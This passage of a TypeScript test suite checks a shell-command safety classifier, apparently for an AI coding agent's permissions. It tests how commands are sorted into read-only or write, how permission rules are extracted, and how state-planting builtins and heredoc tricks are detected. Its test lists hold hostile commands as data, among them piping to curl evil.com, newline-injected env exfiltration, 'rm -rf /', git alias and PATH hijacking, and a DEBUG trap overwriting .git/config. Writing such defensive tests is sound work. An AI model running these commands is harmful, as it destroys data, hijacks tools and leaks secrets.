          { extraReadOnlyRoots: new Set([builtin, 'gitw']) },
        ),
      ).toBe('unknown');
    }
    // The cost this buys: a vouched CLI keeps its own `export` verb.
    expect(
      await classifyShellCommandSafety('mytool export data', {
        extraReadOnlyRoots: new Set(['mytool']),
      }),
    ).toBe('read-only');
  });

  it('screens a git verb behind a -- terminator', async () => {
    // The `--` cut exists to find the verb and screen the options; everything
    // after it is still a positional git reads. Slicing the *truncated* list
    // into the evaluator hid them, so `gitw branch -- newbranch` arrived as a
    // bare `['branch']` — a read — while real git creates the branch.
    for (const command of [
      'gitw branch -- newbranch',
      'gitw checkout -- file.txt',
    ]) {
      expect(await classifyShellCommandSafety(command, withGitw)).not.toBe(
        'read-only',
      );
    }
    // Literal git agrees, which is the promise the wrapper screen makes.
    expect(await classifyShellCommandSafety('git branch -- newbranch')).toBe(
      'write',
    );
  });

  it("screens git's exec-fallback porcelains, which --list-cmds never reports", async () => {
    // `git <verb>` runs `git-<verb>` from PATH for these, so they appear under
    // no `--list-cmds` category even where installed — regenerating the set
    // from its declared source cannot close this.
    for (const command of [
      'gitw svn dcommit',
      'gitw cvsserver',
      'gitw citool',
      'gitw gui',
      'gitw instaweb',
    ]) {
      expect(await classifyShellCommandSafety(command, withGitw)).toBe(
        'unknown',
      );
      expect(
        await classifyShellCommandSafety(command.replace('gitw', 'git')),
      ).toBe('unknown');
    }
  });

  it('decides state planting on the parse, not on the leading word', async () => {
    // Review demonstrated that an anchored raw-text regex over bash's
    // state-planting space cannot be completed: the planter hides behind a
    // block, a keyword, an assignment prefix, a resolution-order prefix, a
    // respelling, a negation, or a function definition, and a bare assignment
    // statement carries no command word at all. Each row below was a witness.
    for (const command of [
      // named planters, plainly spelled
      'cd x',
      'pushd x',
      'popd',
      'export FOO=1',
      'unset PATH',
      'declare -x FOO=1',
      'readonly FOO=1',
      'typeset FOO=1',
      'local FOO=1',
      'set -e',
      'alias git=evil',
      'hash -p ./evil/git git',
      'eval "$X"',
      'source ./x',
      '. ./x',
      // variable-assigning builtins
      'read PATH <<< ./evil',
      'mapfile -t X < f',
      'readarray -t X < f',
      'getopts ab: opt',
      // tree-sitter-bash parses `unsetenv` as an unset_command, and it is one.
      'unsetenv PATH',
      // bare assignment statement: no command word to anchor on
      'PATH=evil',
      'GIT_DIR=/hostile/.git',
      // hiding shapes
      '{ cd /hostile; }',
      'if true; then cd /hostile; fi',
      'FOO=1 cd /hostile',
      'command cd /hostile',
      'builtin cd /hostile',
      '\\cd /hostile',
      '"cd" /hostile',
      '! cd /hostile',
      'git() { rm -rf $HOME; }',
      // fails closed on anything it cannot read
      '$CMD /hostile',
      'cat <<EOF',
      // Round-2 entrances: a flag between the resolution prefix and the
      // planter, an assigning `printf`, an `exec` that carries only a
      // redirect, a substitution inside a redirect target, and the
      // resolution-rebinding builtins.
      'command -p cd /hostile',
      'command -- cd /hostile',
      'builtin -p cd /hostile',
      'printf -v PATH evil',
      'exec > /tmp/out',
      'exec 2>&1 > /tmp/out',
      'echo x < $(./evil.sh)',
      'echo x > $(./evil.sh)',
      'let PATH=a',
      "trap 'cp /tmp/evil .git/config' DEBUG",
      'enable -f ./evil.so git',
      'fc -e vi 1',
      'unalias -a',
      'shopt -s expand_aliases',
      'time cd /tmp',
      'time hash -p ./evil/git git',
    ]) {
      expect(await plantsStateForLaterCommands(command)).toBe(true);
    }

    // Ordinary commands are not planters, including prefix collisions with the
    // named builtins and a word that merely mentions one.
    for (const inert of [
      'git status',
      'npm run build',
      'cdr x',
      'exports x',
      'hashcat x',
      'setup x',
      'echo cd',
      'FOO=1 ls',
      // A resolution prefix in front of an ordinary command is still ordinary,
      // and `printf` without `-v` assigns nothing.
      'command git status',
      'builtin echo hi',
      'time npm run build',
      'printf %s hello',
      'npm run build 2>&1',
      'echo x > /tmp/out',
    ]) {
      expect(await plantsStateForLaterCommands(inert)).toBe(false);
    }
  });

  it('leaves an ordinary flag on a vouched root alone', async () => {
    // The rule above names git's redirecting options rather than refusing
    // every leading-dash argument, so a CLI's own flags still pass.
    for (const command of [
      'ib --json list',
      'ib list --format=json',
      'ib list -l',
      'ib list --no-color',
    ]) {
      expect(await classifyShellCommandSafety(command, withIb)).toBe(
        'read-only',
      );
    }
  });

  it('applies inside compound statements and subshells', async () => {
    expect(await classifyShellCommandSafety('cd /tmp && ib list', withIb)).toBe(
      'read-only',
    );
    expect(
      await classifyShellCommandSafety('(ib list; ib show 1)', withIb),
    ).toBe('read-only');
    expect(await classifyShellCommandSafety('echo $(ib list)', withIb)).toBe(
      'unknown',
    );
  });
});

// =========================================================================
// extractCommandRules
// =========================================================================

describe('extractCommandRules', () => {
  describe('simple commands', () => {
    it('extracts root + known subcommand + wildcard', async () => {
      expect(
        await extractCommandRules('git clone https://github.com/foo/bar.git'),
      ).toEqual(['git clone *']);
    });

    it('extracts npm install with wildcard', async () => {
      expect(await extractCommandRules('npm install express')).toEqual([
        'npm install *',
      ]);
    });

    it('extracts npm outdated without wildcard (no extra args)', async () => {
      expect(await extractCommandRules('npm outdated')).toEqual([
        'npm outdated',
      ]);
    });

    it('extracts cat with wildcard', async () => {
      expect(await extractCommandRules('cat /etc/passwd')).toEqual(['cat *']);
    });

    it('extracts ls with wildcard', async () => {
      expect(await extractCommandRules('ls -la /tmp')).toEqual(['ls *']);
    });

    it('extracts bare command without args', async () => {
      expect(await extractCommandRules('whoami')).toEqual(['whoami']);
    });

    it('extracts unknown command with wildcard', async () => {
      expect(await extractCommandRules('curl https://example.com')).toEqual([
        'curl *',
      ]);
    });

    it('extracts command with only flags', async () => {
      expect(await extractCommandRules('ls -la')).toEqual(['ls *']);
    });
  });

  describe('compound commands', () => {
    it('extracts rules from && compound', async () => {
      expect(await extractCommandRules('git clone foo && npm install')).toEqual(
        ['git clone *', 'npm install'],
      );
    });

    it('extracts rules from || compound', async () => {
      expect(await extractCommandRules('git pull || git fetch origin')).toEqual(
        ['git pull', 'git fetch *'],
      );
    });

    it('extracts rules from ; compound', async () => {
      expect(await extractCommandRules('ls ; cat file')).toEqual([
        'ls',
        'cat *',
      ]);
    });

    it('extracts rules from pipeline', async () => {
      expect(await extractCommandRules('cat file | grep pattern')).toEqual([
        'cat *',
        'grep *',
      ]);
    });

    it('deduplicates rules', async () => {
      expect(
        await extractCommandRules('npm install foo && npm install bar'),
      ).toEqual(['npm install *']);
    });
  });

  describe('docker multi-level subcommands', () => {
    it('extracts docker compose up with args', async () => {
      expect(await extractCommandRules('docker compose up -d')).toEqual([
        'docker compose up *',
      ]);
    });

    it('extracts docker compose up without args', async () => {
      expect(await extractCommandRules('docker compose up')).toEqual([
        'docker compose up',
      ]);
    });

    it('extracts docker run with wildcard', async () => {
      expect(await extractCommandRules('docker run -it ubuntu bash')).toEqual([
        'docker run *',
      ]);
    });
  });

  describe('edge cases', () => {
    it('returns empty for empty string', async () => {
      expect(await extractCommandRules('')).toEqual([]);
    });

    it('returns empty for whitespace', async () => {
      expect(await extractCommandRules('   ')).toEqual([]);
    });

    it('handles env var prefix', async () => {
      expect(await extractCommandRules('FOO=bar npm install')).toEqual([
        'npm install',
      ]);
    });

    it('handles redirected command', async () => {
      expect(await extractCommandRules('echo hello > out.txt')).toEqual([
        'echo *',
      ]);
    });

    it('handles pure variable assignment (no rule)', async () => {
      expect(await extractCommandRules('FOO=bar')).toEqual([]);
    });

    it('extracts cargo subcommands', async () => {
      expect(await extractCommandRules('cargo build --release')).toEqual([
        'cargo build *',
      ]);
    });

    it('extracts kubectl subcommands', async () => {
      expect(await extractCommandRules('kubectl get pods -n default')).toEqual([
        'kubectl get *',
      ]);
    });

    it('extracts pip install', async () => {
      expect(await extractCommandRules('pip install requests')).toEqual([
        'pip install *',
      ]);
    });

    it('extracts pnpm subcommands', async () => {
      expect(await extractCommandRules('pnpm add -D typescript')).toEqual([
        'pnpm add *',
      ]);
    });
  });
});
// =========================================================================
// Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
// =========================================================================

describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
  afterEach(() => {
    _resetParser();
  });

  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    // Both implementations agree: ls is read-only
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
  });

  it('maps parser unavailability to unknown in the classification API', async () => {
    _setParserFailedForTesting();
    expect(await classifyShellCommandSafety('git status')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
  });

  it('keeps the Git config gate when the parser is unavailable', async () => {
    const cwd = mkdtempSync(path.join(tmpdir(), 'qwen-git-fallback-'));
    try {
      execFileSync('git', ['init', '-q'], { cwd });
      execFileSync('git', ['config', 'core.fsmonitor', 'example-fsmonitor'], {
        cwd,
      });
      _setParserFailedForTesting();
      expect(
        await isShellCommandReadOnlyASTInDirectory('git status', cwd),
      ).toBe(false);
    } finally {
      rmSync(cwd, { recursive: true, force: true });
    }
  });

  it('treats syntax errors as unknown without widening the boolean API', async () => {
    expect(isShellCommandReadOnly('ls |')).toBe(false);
    expect(await classifyShellCommandSafety('ls |')).toBe('unknown');
    expect(await isShellCommandReadOnlyAST('ls |')).toBe(false);
  });

  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });

  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
  });

  it('returns regex result for write-redirection command when parser is marked failed', async () => {
    _setParserFailedForTesting();
    expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
  });

  it('fallback result matches direct regex call', async () => {
    _setParserFailedForTesting();
    const commands = [
      'ls -la',
      'rm -rf /',
      'git status',
      'git push origin main',
      'cat file | grep pattern',
      'echo hello > out.txt',
      'find . -name "*.ts"',
      'find . -exec rm {} \\;',
      "sed -i 's/a/b/' file",
      'FOO=bar ls',
    ];
    for (const cmd of commands) {
      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
        isShellCommandReadOnly(cmd),
      );
    }
  });

  it('re-initialises normally after _resetParser', async () => {
    _setParserFailedForTesting();
    _resetParser();
    await initParser(); // should succeed
    // After reset, AST parser is used again
    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
    expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
  });
});

// =========================================================================
// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
//
// Both implementations must agree on all cases in this suite.
// Cases where a known, intentional divergence exists are labelled with
// [divergence] and include an explanation.
// =========================================================================

describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
  // Pairs of [command, expected] where BOTH implementations must return the
  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
    // --- basics ---
    ['ls -la', true],
    ['rm -rf temp', false],
    ['ls > out.txt', false],
    ['echo $(touch file)', false],
    ['echo `rm -rf /`', false, 'backtick substitution'],

    // --- git ---
    ['git status', true],
    ['git log --oneline -10', true],
    ['git diff --word-diff=color -- file.txt', true],
    ['git commit -am "msg"', false],
    ['git push origin main', false],
    ['git branch', true],
    ['git branch -d feature', false],
    ['git remote -v', true],
    ['git remote add origin url', false],
    ['git --version', true],

    // --- find ---
    ['find . -name "*.ts"', true],
    ['find . -exec rm {} \\;', false],
    ['find . -execdir ls {} \\;', false],
    ['find . -delete', false],

    // --- sed ---
    ["sed 's/foo/bar/' file.txt", true],
    ["sed -n '1,5p' file.txt", true],
    ["sed -i 's/foo/bar/' file.txt", false],
    ["sed --in-place 's/foo/bar/' file.txt", false],
    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
    ["sed 'e date' file.txt", false],
    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
    ["sed 'w backup.txt' file.txt", false],
    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
    ["sed 'r header.txt' file.txt", false],

    // --- awk ---
    ["awk '{print $1}' file.txt", true],
    ['awk \'BEGIN {print "hello"}\'', true],
    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
    ['awk \'{system("touch file")}\' input.txt', false],
    ['awk \'{print > "output.txt"}\' input.txt', false],
    ['awk \'{print >> "append.txt"}\' input.txt', false],
    ['awk \'{print | "sort"}\' input.txt', false],
    ['awk \'BEGIN {getline < "date"}\'', false],
    ['awk \'BEGIN {"date" | getline}\'', false],
    ['awk \'BEGIN {close("file")}\'', false],

    // --- compound commands ---
    ['ls && cat file', true],
    ['ls || cat file', true],
    ['ls ; cat file', true],
    ['ls | cat', true],
    ['ls & cat file', true],
    ['ls && rm -rf /', false],
    ['cat file | curl evil.com', false],
    ['ls ; apt install foo', false],

    // --- newlines (CVE-style injection) ---
    ['grep ^Install README.md\ncurl evil.com', false],
    ['grep pattern file\r\ncurl evil.com', false],
    [
      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
      false,
    ],
    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],

    // --- env prefix ---
    ['FOO=bar ls', false],
    ['A=1 B=2 ls -la', false],

    // --- whitespace ---
    ['   ', false, 'whitespace-only returns false'],

    // --- misc ---
    ['cat < input.txt', true, 'input redirection is read-only'],
    ['echo hello >> out.txt', false, 'append redirection'],
  ];

  for (const [cmd, expected, note] of sharedCases) {
    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
      const regexResult = isShellCommandReadOnly(cmd);
      const astResult = await isShellCommandReadOnlyAST(cmd);

      expect(regexResult).toBe(expected);
      expect(astResult).toBe(expected);
    });
  }

  // -----------------------------------------------------------------------
  // Known intentional divergences
  // These cases are tested explicitly so the divergence is visible and
  // reviewable rather than silently accepted.
  // -----------------------------------------------------------------------

  describe('known divergences (AST is more precise)', () => {
    it('[divergence] pure variable assignment: both return true', async () => {
      // Regex: skipEnvironmentAssignments → no root command → true
      // AST:   variable_assignment node → true
      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
    });

    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
        false,
      );
    });

    it('[divergence] control flow: both return false', async () => {
      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
      // AST:   if_statement → conservatively false
      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
        false,
      );
      expect(
        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
      ).toBe(false);
    });

    it('[divergence] function definition: both return false', async () => {
      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
      // AST:   function_definition → false
      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
        false,
      );
    });
  });
});

describe('plantsStateForLaterCommands', () => {
  it('decides state planting on the parse, not on the leading word', async () => {
    // A confirmation dialog is built by dropping the sub-commands that
    // classify read-only, which is sound only while each part means the same
    // thing alone as it does in sequence. Deciding that on raw text cannot be
    // completed: the planter hides behind a block, a keyword, an assignment
    // prefix, a resolution-order prefix, a respelling, a negation, or a
    // function definition, and a bare assignment carries no command word.
    for (const command of [
      // named planters, plainly spelled
      'cd x',
      'pushd x',
      'popd',
      'export FOO=1',
      'unset PATH',
      'declare -x FOO=1',
      'readonly FOO=1',
      'typeset FOO=1',
      'local FOO=1',
      'set -e',
      'shopt -s expand_aliases',
      'alias git=evil',
      'unalias -a',
      'hash -p ./evil/git git',
      "trap 'cp /tmp/evil .git/config' DEBUG",
      'enable -f ./evil.so git',
      'fc -e vi 1',
      'let PATH=a',
      'eval "$X"',
      'exec > /tmp/out',
      'source ./x',
      '. ./x',
      // variable-assigning builtins
      'read PATH <<< ./evil',
      'mapfile -t X < f',
      'readarray -t X < f',
      'getopts ab: opt',
      'unsetenv PATH',
      'printf -v PATH evil',
      // bare assignment statement: no command word to anchor on
      'PATH=evil',
      'GIT_DIR=/hostile/.git',
      // hiding shapes
      '{ cd /hostile; }',
      'if true; then cd /hostile; fi',
      'FOO=1 cd /hostile',
      'command cd /hostile',
      'builtin cd /hostile',
      'command -p cd /hostile',
      'command -- cd /hostile',
      'time cd /tmp',
      '\\cd /hostile',
      '"cd" /hostile',
      '! cd /hostile',
      'git() { rm -rf $HOME; }',
      // a substitution in a redirect target runs before anything after it
      'echo x < $(./evil.sh)',
      'echo x > $(./evil.sh)',
      // fails closed on anything it cannot read
      '$CMD /hostile',
      'cat <<EOF',
    ]) {
      expect(await plantsStateForLaterCommands(command)).toBe(true);
    }
  });

  it('leaves ordinary commands alone', async () => {
    for (const inert of [
      'git status',
      'npm run build',
      'ls -la',
      'cdr x',
      'exports x',
      'hashcat x',
      'setup x',
      'echo cd',
      'FOO=1 ls',
      'command git status',
      'builtin echo hi',
      'time npm run build',
      'printf %s hello',
      'npm run build 2>&1',
      'echo x > /tmp/out',
    ]) {
      expect(await plantsStateForLaterCommands(inert)).toBe(false);
    }
  });

  it('fails closed on an unparseable segment', async () => {
    for (const command of ['', '   ', 'if then fi else']) {
      expect(await plantsStateForLaterCommands(command)).toBe(true);
    }
  });
});

describe('statements nested inside a heredoc redirect', () => {
  // tree-sitter parses whatever follows the heredoc opener on the same line
  // *inside* the redirect node, beside the body. The `redirected_statement`
  // arm filtered every redirect child out before evaluation, so an entire
  // write segment vanished from the analysis.
  it.each([
    'cat <<EOF && rm -rf build\nhello\nEOF',
    'cat <<EOF; rm -rf build\nhello\nEOF',
    'cat <<EOF | rm -rf build\nhello\nEOF',
    'cat <<EOF || rm -rf build\nhello\nEOF',
    'cat <<EOF & rm -rf build\nhello\nEOF',
    'cat <<EOF && mkdir -p build\nhello\nEOF',
    'cat <<EOF && tee out.txt\nhello\nEOF',
    'cat <<-EOF && rm -rf build\n\thello\n\tEOF',
  ])('does not lose the segment after the opener in %j', async (command) => {
    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
  });

  it.each([
    'cat <<EOF && for ((i=0;i<1;i++)); do rm -rf build; done\nhello\nEOF',
    'cat <<EOF && if true; then rm -rf build; fi\nhello\nEOF',
    'cat <<EOF && while true; do rm -rf build; done\nhello\nEOF',
    'cat <<EOF && { rm -rf build; }\nhello\nEOF',
    'cat <<EOF && ! rm -rf build\nhello\nEOF',
    'cat <<EOF && (rm -rf build)\nhello\nEOF',
    'cat <<EOF && case x in x) rm -rf build;; esac\nhello\nEOF',
  ])('sees compound statements after the opener in %j', async (command) => {
    // The first fix enumerated the shapes it had witnesses for; these are the
    // ones that were still dropped. The skip-list is inverted now, so an
    // unrecognised shape is evaluated rather than filtered away.
    expect(await isShellCommandReadOnlyAST(command)).toBe(false);
  });

  it.each([
    'cat <<EOF >out.txt\nhello\nEOF',
    'cat <<EOF >>out.txt\nhello\nEOF',
    'cat <<EOF 2>out.txt\nhello\nEOF',
    'cat <<EOF >&out.txt\nhello\nEOF',
  ])(
    'sees a write redirect nested in the heredoc node in %j',
    async (command) => {
      // Same root cause from the other side: a redirect written after the
      // opener is parsed *inside* the heredoc node, where the redirection walk
      // never reached it — it only iterates the direct children of the
      // `redirected_statement`. So the write was invisible.
      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
    },
  );

  it('still reads an ordinary heredoc as read-only', async () => {
    // The inert leaves — the delimiters, the body — must not start
    // classifying as statements, and a nested descriptor duplication is not a
    // write: `2>&1` names a descriptor, not a file.
    for (const command of [
      'cat <<EOF\nhello\nEOF',
      'cat <<-EOF\n\thello\n\tEOF',
      "cat <<'EOF'\n`rm -rf build`\nEOF",
      'cat <<EOF 2>&1\nhello\nEOF',
      'cat <<EOF 2>&-\nhello\nEOF',
      'grep x <<EOF\nhello\nEOF',
    ]) {
      expect(await isShellCommandReadOnlyAST(command)).toBe(true);
    }
  });
});
